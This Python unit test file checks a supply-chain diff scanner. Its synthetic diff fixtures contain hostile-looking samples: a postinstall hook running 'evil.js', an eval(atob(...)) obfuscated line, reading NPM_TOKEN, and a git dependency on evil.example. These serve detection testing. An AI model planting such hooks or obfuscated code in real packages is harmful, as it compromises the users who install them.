"""Unit tests for the deterministic supply-chain pre-scan (pure, no LLM)."""

from __future__ import annotations

from forge.pr_review_ensemble.diffscan import scan_supply_chain


def _file(path: str, added: list[str]) -> str:
    body = "".join(f"+{ln}\n" for ln in added)
    return (
        f"diff --git a/{path} b/{path}\nindex 0..1 100644\n"
        f"--- a/{path}\n+++ b/{path}\n@@ -0,0 +1,{len(added)} @@\n{body}"
    )


def _cats(scan) -> set[str]:
    return {s.category for s in scan.signals}


def test_dependency_manifest():
    scan = scan_supply_chain(_file("package.json", ['  "left-pad": "^1.0.0"']))
    assert "dependency" in _cats(scan)
    assert "package.json" in scan.relevant_files


def test_lockfile_not_line_scanned():
    # a lockfile's long base64 integrity hash must NOT trip the obfuscation blob pattern
    scan = scan_supply_chain(
        _file("package-lock.json", ['"integrity": "sha512-' + "A" * 200 + '"'])
    )
    assert [s.category for s in scan.signals] == ["lockfile"]


def test_postinstall_hook_in_manifest():
    scan = scan_supply_chain(_file("package.json", ['  "postinstall": "node ./evil.js"']))
    assert "install-hook" in _cats(scan)


def test_install_hook_file():
    scan = scan_supply_chain(_file("setup.py", ['print("building")']))
    assert "install-hook" in _cats(scan)


def test_ci_workflow_and_pattern():
    scan = scan_supply_chain(_file(".github/workflows/ci.yml", ["on: pull_request_target"]))
    assert "ci" in _cats(scan)


def test_obfuscation_eval():
    scan = scan_supply_chain(_file("src/x.js", ["eval(atob('" + "Zm9v" * 60 + "'))"]))
    assert "obfuscation" in _cats(scan)


def test_secret_access():
    scan = scan_supply_chain(_file("src/x.py", ["token = os.environ['NPM_TOKEN']"]))
    assert "secret" in _cats(scan)


def test_git_url_dependency_beats_network():
    scan = scan_supply_chain(_file("requirements.txt", ["evil @ git+https://evil.example/p.git"]))
    cats = _cats(scan)
    assert "dependency" in cats  # requirements file + the git+ pattern (not classified as network)
    assert "network" not in cats


def test_binary_file():
    diff = (
        "diff --git a/blob.bin b/blob.bin\nnew file mode 100644\nindex 0..1\n"
        "Binary files /dev/null and b/blob.bin differ\n"
    )
    assert "binary" in _cats(scan_supply_chain(diff))


def test_clean_diff_no_signals():
    scan = scan_supply_chain(_file("src/util.py", ["def add(a, b):", "    return a + b"]))
    assert not scan.has_signals
    assert scan.relevant_diff == ""


def test_relevant_diff_only_flagged_files():
    clean = _file("src/util.py", ["x = 1"])
    dep = _file("package.json", ['  "a": "1.0"'])
    scan = scan_supply_chain(clean + dep)
    assert scan.relevant_files == ["package.json"]
    assert "package.json" in scan.relevant_diff
    assert "src/util.py" not in scan.relevant_diff


def test_caps_signals_per_file():
    scan = scan_supply_chain(_file("src/x.js", [f"eval(x{i})" for i in range(20)]))
    file_sigs = [s for s in scan.signals if s.file == "src/x.js"]
    assert len(file_sigs) <= 7  # 6 cap + 1 "(+N more)" marker
    assert any("more matches" in s.evidence for s in file_sigs)
